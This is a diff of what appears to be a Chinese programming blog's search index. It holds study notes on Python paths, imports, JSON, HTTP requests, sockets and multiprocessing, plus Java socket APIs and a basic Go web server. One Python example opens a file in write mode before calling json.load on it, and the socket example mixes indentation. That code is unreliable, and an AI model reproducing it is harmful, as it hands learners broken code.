+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__file__ <span class="comment"># 当前文件的路径（可能为相对路径，取决于python文件执行的方式）</span></span><br><span class="line">os.path.realpath(__file__) <span class="comment"># 获取当前文件的绝对路径</span></span><br><span class="line">os.path.dirname(os.path.realpath(__file__)) <span class="comment"># 获取当前文件所在目录（不包含文件名）</span></span><br><span class="line">os.path.join(path,<span class="string">"test.yaml"</span>) <span class="comment"># 由目录和文件名结合成为新的文件绝对路径</span></span><br></pre></td></tr></table></figure>
+<h2 id="import-的使用"><a class="header-anchor" href="#import-的使用"></a>import 的使用</h2>
 <p>​	一个<code>.py</code>文件可以看作是一个模块（module），使用<code>import</code>命令将一个模块引入当前python文件，则可以在当前文件使用引入模块中定义的变量，函数等。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import module_name	#module_name.py文件可以在sys.path中或者当前文件所在文件夹中</span><br><span class="line">from module_name import xxx		#从module_name.py中引入xxx变量或者xxx函数</span><br><span class="line">from package_name import module_name	#从系统目录或当前目录的package_name包里找到module_name.py并引入</span><br></pre></td></tr></table></figure>
-<h2 id="python3-和-python2-在编码上的区别"><a class="header-anchor" href="#python3-和-python2-在编码上的区别"></a>python3 和 python2 在编码上的区别</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module_name	<span class="comment">#module_name.py文件可以在sys.path中或者当前文件所在文件夹中</span></span><br><span class="line"><span class="keyword">import</span> module_name <span class="keyword">as</span> mod <span class="comment">#引入module_name并设置别名为 mod</span></span><br><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> xxx		<span class="comment">#从module_name.py中引入xxx变量或者xxx函数</span></span><br><span class="line"><span class="comment">#从系统目录或当前目录的package_name包里找到module_name.py并引入</span></span><br><span class="line"><span class="keyword">from</span> package_name <span class="keyword">import</span> module_name</span><br></pre></td></tr></table></figure>
+<h2 id="序列化和反序列化"><a class="header-anchor" href="#序列化和反序列化"></a>序列化和反序列化</h2>
+<p>序列化</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict1 = &#123;<span class="string">"name"</span>:<span class="string">"Dawnyh"</span>, <span class="string">"age"</span>:<span class="number">20</span>, <span class="string">"id"</span>:<span class="string">"2333"</span>&#125;</span><br><span class="line">json_str = json.dumps(dict1) <span class="comment"># 将dict1转为json格式的字符串</span></span><br><span class="line">dict2 = json.loads(json_str) <span class="comment"># 把字符串反序列化为一个新的dict</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"file1.json"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(dict1, f) <span class="comment"># 序列化后保存到文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"file1.json"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dict3 = json.load(f) <span class="comment"># 从文件反序列化为dict</span></span><br></pre></td></tr></table></figure>
+<h2 id="HTTP"><a class="header-anchor" href="#HTTP"></a>HTTP</h2>
+<h3 id="发起请求"><a class="header-anchor" href="#发起请求"></a>发起请求</h3>
+<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://example.com"</span></span><br><span class="line"><span class="comment">#获取响应包</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#判断相应包状态码，若不为200则抛出异常</span></span><br><span class="line">	r.raise_for_status()</span><br><span class="line">	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line">	r.encoding = r.apparent_encoding</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">"error!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取响应包内容</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<h3 id="处理请求"><a class="header-anchor" href="#处理请求"></a>处理请求</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">'0.0.0.0'</span>,<span class="number">18080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket，AF_INET表示使用IPv4协议，SOCK_STREAM表示采用TCP协议通信</span></span><br><span class="line">listen_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># SO_REUSEADDR允许单个进程捆绑同一端口到多个套接字上</span></span><br><span class="line">listen_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="number">1</span>)</span><br><span class="line">listen_socket.bind((HOST,PORT)) <span class="comment"># 绑定IP和端口</span></span><br><span class="line">listen_socket.listen(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Serving HTTP on port %s ...'</span> % PORT)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	client_connection,client_address = listen_socket.accept()</span><br><span class="line">	request = client_connection.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="comment"># 输出请求内容</span></span><br><span class="line">    print(request)</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 返回响应内容</span></span><br><span class="line">	http_response = <span class="string">b"""</span></span><br><span class="line"><span class="string">	HTTP/1.1 200 OK\r\n</span></span><br><span class="line"><span class="string">	\r\n</span></span><br><span class="line"><span class="string">	Hello,world!</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	client_connection.send(http_response)</span><br><span class="line">	client_connection.close()</span><br></pre></td></tr></table></figure>
+<h2 id="函数装饰器"><a class="header-anchor" href="#函数装饰器"></a>函数装饰器</h2>
+<p>在python中，一切皆对象，包括函数。所以我们可以把函数赋值给变量，也可以把函数作为另一个函数的参数或者返回值，这就是python函数装饰器的基础。python中的装饰器也是一个函数，这个函数的作用是为其他函数增加一些流程或者说行为，也就是装饰。</p>
+<p>python函数装饰器常用于权限认证以及记录日志</p>
+<h2 id="并发"><a class="header-anchor" href="#并发"></a>并发</h2>
+<h3 id="多进程"><a class="header-anchor" href="#多进程"></a>多进程</h3>
+<p>考虑到跨平台编程的需求，使用multiprocessing模块中的Process类进行子进程的创建和启动</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getpid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time, sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_task</span><span class="params">(filename)</span>:</span></span><br><span class="line">    print(<span class="string">'启动下载进程，进程号[%d].'</span> % getpid())</span><br><span class="line">    print(<span class="string">'开始下载%s...'</span> % filename)</span><br><span class="line">    time_to_download = randint(<span class="number">5</span>, <span class="number">10</span>) <span class="comment"># 5到10之间的随机整数</span></span><br><span class="line">    sleep(time_to_download)</span><br><span class="line">    print(<span class="string">'%s下载完成! 耗费了%d秒'</span> % (filename, time_to_download))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    start = time()</span><br><span class="line">    <span class="comment"># 创建进程对象p1，执行函数download_task，传入参数('Python从入门到住院.pdf', )</span></span><br><span class="line">    p1 = Process(target=download_task, args=(<span class="string">'Python从入门到住院.pdf'</span>, ))</span><br><span class="line">    p1.start() <span class="comment"># 启动进程</span></span><br><span class="line">    p2 = Process(target=download_task, args=(<span class="string">'Peking Hot.avi'</span>, ))</span><br><span class="line">    p2.start()</span><br><span class="line">    p1.join() <span class="comment"># 等待进程执行结束</span></span><br><span class="line">    p2.join()</span><br><span class="line">    end = time()</span><br><span class="line">    print(<span class="string">'总共耗费了%.2f秒.'</span> % (end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>在多个进程进行同步时，则需要用到进程间通信</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_pingpong</span><span class="params">(queue,str1)</span>:</span></span><br><span class="line">	<span class="keyword">while</span> queue.qsize() &lt; <span class="number">10</span>: <span class="comment"># 判断队列中的元素个数</span></span><br><span class="line">		print(queue.qsize())</span><br><span class="line">		queue.put(<span class="number">1</span>) <span class="comment"># 将元素入队列</span></span><br><span class="line">		<span class="comment"># print(str1)</span></span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main1</span><span class="params">()</span>:</span></span><br><span class="line">	queue = Queue(<span class="number">10</span>) <span class="comment"># 创建一个队列</span></span><br><span class="line">    <span class="comment"># 把队列作为参数传入</span></span><br><span class="line">	p1 = Process(target=print_pingpong, args=(queue,<span class="string">'ping'</span>, )) </span><br><span class="line">	p1.start()</span><br><span class="line">	p2 = Process(target=print_pingpong, args=(queue,<span class="string">'pong'</span>, ))</span><br><span class="line">	p2.start()</span><br><span class="line">	p1.join()</span><br><span class="line">	p2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main1()</span><br></pre></td></tr></table></figure>
+<h3 id="多线程"><a class="header-anchor" href="#多线程"></a>多线程</h3>
+<h2 id="python3-VS-python2"><a class="header-anchor" href="#python3-VS-python2"></a>python3  VS  python2</h2>
+<h3 id="在编码上的区别"><a class="header-anchor" href="#在编码上的区别"></a>在编码上的区别</h3>
 <p>​		在 Python2 中，字符串有两个类型，一个是 unicode，一个是 str，前者表示文本字符串，后者表示字节序列，不过两者并没有明显的界限，开发时容易出现编码错误。在 Python3 中对两者做了严格区分，分别用 str 表示字符串，bytes 表示字节序列，任何需要写入文本或者网络传输的数据都只接收字节序列，这就从源头上阻止了编码错误的问题。</p>
 <p>​		要指定一个字符串为 bytes 类型，有三种方法：</p>
 <ul>
@@ -1835,71 +1926,6 @@
 </ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str_a = <span class="string">b"Hello World!"</span>				<span class="comment">#正确</span></span><br><span class="line">str_b = <span class="string">b"一个字符串。"</span>				<span class="comment">#错误</span></span><br><span class="line">str_c = <span class="string">"一个字符串"</span>.encode(<span class="string">'utf-8'</span>)	<span class="comment">#正确，不指定编码方式也默认以utf-8编码</span></span><br><span class="line">str_d = bytes(<span class="string">"abcde"</span>,<span class="string">'utf-8'</span>)		<span class="comment">#正确，第二个参数不可省略</span></span><br></pre></td></tr></table></figure>
 <p>C语言的 printf 函数不支持 Unicode 字符串的输出。在 python3 中想要调用C语言的printf函数，需要将参数由 Unicode 字符串转化为字节序列</p>
-<h2 id="类型转换函数"><a class="header-anchor" href="#类型转换函数"></a>类型转换函数</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool	根据传入的参数的逻辑值创建一个新的布尔值</span><br><span class="line">int		根据传入的参数创建一个新的整数</span><br><span class="line">float	根据传入的参数创建一个新的浮点数</span><br><span class="line"></span><br><span class="line">bin		将整数转换成2进制字符串</span><br><span class="line">oct		将整数转化成8进制数字符串</span><br><span class="line">hex		将整数转换成16进制字符串</span><br><span class="line"></span><br><span class="line">ord		返回Unicode字符对应的整数</span><br><span class="line">chr		返回整数所对应的Unicode字符</span><br><span class="line">str		返回一个对象的字符串表现形式</span><br><span class="line"></span><br><span class="line">tuple	根据传入的参数创建一个新的元组</span><br><span class="line">list	根据传入的参数创建一个新的列表</span><br><span class="line">dict	根据传入的参数创建一个新的字典</span><br><span class="line">set		根据传入的参数创建一个新的集合</span><br></pre></td></tr></table></figure>
-<h2 id="字符串常用函数"><a class="header-anchor" href="#字符串常用函数"></a>字符串常用函数</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.字母处理：</span></span><br><span class="line">.upper()    <span class="comment"># 全部大写</span></span><br><span class="line">.lower()    <span class="comment"># 全部小写</span></span><br><span class="line">.swapcase()    <span class="comment"># 大小写互换</span></span><br><span class="line">.capitalize()    <span class="comment"># 首字母大写，其余小写</span></span><br><span class="line">.title()    <span class="comment"># 首字母大写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.格式化相关</span></span><br><span class="line">.ljust(width)     <span class="comment"># 获取固定长度，左对齐，右边不够用空格补齐</span></span><br><span class="line">.rjust(width)     <span class="comment"># 获取固定长度，右对齐，左边不够用空格补齐</span></span><br><span class="line">.center(width)  <span class="comment"># 获取固定长度，中间对齐，两边不够用空格补齐</span></span><br><span class="line">.zfill(width)      <span class="comment"># 获取固定长度，右对齐，左边不足用0补齐</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.字符串搜索相关</span></span><br><span class="line">.find()    <span class="comment"># 搜索指定字符串，找到则返回对应下标，没有则返回-1</span></span><br><span class="line">.index()    <span class="comment"># 同上，但是找不到会报错</span></span><br><span class="line">.rfind()    <span class="comment"># 从右边开始查找</span></span><br><span class="line">.count()    <span class="comment"># 统计指定的字符串出现的次数</span></span><br></pre></td></tr></table></figure>
-<h2 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h2>
-<h3 id="文件写入"><a class="header-anchor" href="#文件写入"></a>文件写入</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file1 = open(<span class="string">"file_name"</span>,<span class="string">"mode"</span>)</span><br><span class="line">file1.write()</span><br><span class="line">file1.close</span><br></pre></td></tr></table></figure>
-<p>mode如下表所示</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">字符</th>
-<th style="text-align:center">含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center"><code>'r'</code></td>
-<td style="text-align:center">打开阅读（默认）</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>'w'</code></td>
-<td style="text-align:center">打开写入，首先截断文件</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>'x'</code></td>
-<td style="text-align:center">打开独占创建，如果文件已经存在则失败</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>'a'</code></td>
-<td style="text-align:center">打开写入，追加到文件末尾（如果存在）</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>'b'</code></td>
-<td style="text-align:center">二进制模式</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>'t'</code></td>
-<td style="text-align:center">文本模式（默认）</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>'+'</code></td>
-<td style="text-align:center">打开磁盘文件进行更新（读取和写入）</td>
-</tr>
-</tbody>
-</table>
-<h2 id="http"><a class="header-anchor" href="#http"></a>http</h2>
-<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://example.com"</span></span><br><span class="line"><span class="comment">#获取响应包</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#判断相应包状态码，若不为200则抛出异常</span></span><br><span class="line">	r.raise_for_status()</span><br><span class="line">	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line">	r.encoding = r.apparent_encoding</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">"error!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取响应包内容</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-<h2 id="输入输出"><a class="header-anchor" href="#输入输出"></a>输入输出</h2>
-<p><strong>输出</strong></p>
-<p>print格式化字符串</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">'%d,%d'</span>%(i,j),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
-<p><strong>输入</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = input(<span class="string">"input a number!\n"</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="数据结构"><a class="header-anchor" href="#数据结构"></a>数据结构</h2>
-<h3 id="list"><a class="header-anchor" href="#list"></a>list</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">a.append(<span class="string">'a'</span>)	<span class="comment">#在列表最后加入一个元素'a'</span></span><br><span class="line">a.pop(<span class="number">0</span>)		<span class="comment">#删除列表中索引为0的元素</span></span><br><span class="line">a.insert(<span class="number">0</span>,<span class="string">'b'</span>)	<span class="comment">#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位</span></span><br><span class="line">a.index(<span class="string">'b'</span>)	<span class="comment">#返回元素'b'在列表中第一次出现的位置</span></span><br><span class="line">a.count(<span class="string">'b'</span>)	<span class="comment">#元素'b'在列表中出现的次数</span></span><br><span class="line">a.__len__()		<span class="comment">#返回列表的长度</span></span><br></pre></td></tr></table></figure>
-<h3 id="链表"><a class="header-anchor" href="#链表"></a>链表</h3>
-<p>python中没有指针，只能通过数组来实现静态的链表。把数组节点的下标当作链表节点的<code>地址</code>，首先定义节点类，节点类的对象数组即为我们想要的链表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#节点类定义如下</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val=<span class="number">0</span>, next=None)</span>:</span></span><br><span class="line">		self.val = val</span><br><span class="line">		self.next = next</span><br></pre></td></tr></table></figure>
-<h2 id="函数装饰器"><a class="header-anchor" href="#函数装饰器"></a>函数装饰器</h2>
-<p>在python中，一切皆对象，包括函数。所以我们可以把函数赋值给变量，也可以把函数作为另一个函数的参数或者返回值，这就是python函数装饰器的基础。python中的装饰器也是一个函数，这个函数的作用是为其他函数增加一些流程或者说行为，也就是装饰。</p>
-<p>python函数装饰器常用于权限认证以及记录日志</p>
-<h2 id="并发"><a class="header-anchor" href="#并发"></a>并发</h2>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -1907,6 +1933,24 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java网络编程</title>
+    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
+<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -1967,24 +2011,6 @@
       </categories>
       <tags>
         <tag>环境配置</tag>
-        <tag>go</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>golang Web后端</title>
-    <url>/2021/07/22/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Web%E5%90%8E%E7%AB%AF/</url>
-    <content><![CDATA[<p>一个简单的web服务器</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"strings"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhelloName</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	r.ParseForm()  <span class="comment">//解析参数，默认是不会解析的</span></span><br><span class="line">	fmt.Println(r.Form)  <span class="comment">//这些信息是输出到服务器端的打印信息</span></span><br><span class="line">	fmt.Println(<span class="string">"path"</span>, r.URL.Path)</span><br><span class="line">	fmt.Println(<span class="string">"scheme"</span>, r.URL.Scheme)</span><br><span class="line">	fmt.Println(r.Form[<span class="string">"url_long"</span>])</span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> r.Form &#123;</span><br><span class="line">		fmt.Println(<span class="string">"key:"</span>, k)</span><br><span class="line">		fmt.Println(<span class="string">"val:"</span>, strings.Join(v, <span class="string">""</span>))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">"Hello astaxie!"</span>) <span class="comment">//这个写入到w的是输出到客户端的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayGoodBye</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">"Goodbye astaxie!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">"/"</span>, sayhelloName) <span class="comment">//设置访问的路由</span></span><br><span class="line">    http.HandleFunc(<span class="string">"/bye"</span>, sayGoodBye)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">":9090"</span>, <span class="literal">nil</span>) <span class="comment">//设置监听的端口</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">"ListenAndServe: "</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们只需要使用http包的两个函数——<code>HandleFunc()</code>和<code>ListenAndServe()</code>，就可以启动一个简单的web服务。</p>
-<p><code>ListenAndServer()</code>监听服务端口并在http请求到来时调用<code>HandleFunc()</code>进行处理</p>
-<p><code>HandleFunc()</code>会根据http请求路径的不同调用不同的逻辑处理函数</p>
-<p>Go作web服务器不需要nginx/apache，因为它直接监听了tcp端口，做了nginx的事情，而且这个Web服务内部有支持高并发的特性</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>go</category>
-      </categories>
-      <tags>
         <tag>go</tag>
       </tags>
   </entry>
@@ -2218,6 +2244,24 @@
       </tags>
   </entry>
   <entry>
+    <title>golang Web后端</title>
+    <url>/2021/07/22/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Web%E5%90%8E%E7%AB%AF/</url>
+    <content><![CDATA[<p>一个简单的web服务器</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"strings"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhelloName</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	r.ParseForm()  <span class="comment">//解析参数，默认是不会解析的</span></span><br><span class="line">	fmt.Println(r.Form)  <span class="comment">//这些信息是输出到服务器端的打印信息</span></span><br><span class="line">	fmt.Println(<span class="string">"path"</span>, r.URL.Path)</span><br><span class="line">	fmt.Println(<span class="string">"scheme"</span>, r.URL.Scheme)</span><br><span class="line">	fmt.Println(r.Form[<span class="string">"url_long"</span>])</span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> r.Form &#123;</span><br><span class="line">		fmt.Println(<span class="string">"key:"</span>, k)</span><br><span class="line">		fmt.Println(<span class="string">"val:"</span>, strings.Join(v, <span class="string">""</span>))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">"Hello astaxie!"</span>) <span class="comment">//这个写入到w的是输出到客户端的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayGoodBye</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">"Goodbye astaxie!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">"/"</span>, sayhelloName) <span class="comment">//设置访问的路由</span></span><br><span class="line">    http.HandleFunc(<span class="string">"/bye"</span>, sayGoodBye)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">":9090"</span>, <span class="literal">nil</span>) <span class="comment">//设置监听的端口</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">"ListenAndServe: "</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们只需要使用http包的两个函数——<code>HandleFunc()</code>和<code>ListenAndServe()</code>，就可以启动一个简单的web服务。</p>
+<p><code>ListenAndServer()</code>监听服务端口并在http请求到来时调用<code>HandleFunc()</code>进行处理</p>
+<p><code>HandleFunc()</code>会根据http请求路径的不同调用不同的逻辑处理函数</p>
+<p>Go作web服务器不需要nginx/apache，因为它直接监听了tcp端口，做了nginx的事情，而且这个Web服务内部有支持高并发的特性</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>go</category>
+      </categories>
+      <tags>
+        <tag>go</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>golang项目结构</title>
     <url>/2021/07/17/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
